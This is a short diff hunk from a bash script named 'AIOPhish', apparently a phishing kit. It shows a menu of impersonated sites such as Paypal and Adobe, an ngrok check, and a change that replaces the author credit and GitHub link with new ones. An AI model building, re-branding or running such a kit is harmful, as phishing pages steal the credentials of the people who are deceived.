@@ -284,8 +284,8 @@ echo -e "$a[$b 19$v ]$b Paypal            $a[$b 39$v ]$b Adobe"
 echo -e "$a[$b 20$v ]$b Pinterest         $a[$b 40$v ]$b Pornhub"
 }
 finish() {
-        echo -e "$v[$b*$v]$b AIOPhish by HiddenStar😛"
-	echo -e "$v[$b*$v]$b https://github.com/HiddenSt4r"
+        echo -e "$v[$b*$v]$b AIOPhish by DeepSociety"
+	echo -e "$v[$b*$v]$b https://github.com/DeepSociety"
 	if [[ -f ngrok ]];then
 	if [[ -d $ruta_carpeta/images ]];then
         rm -rf $ruta_carpeta/images
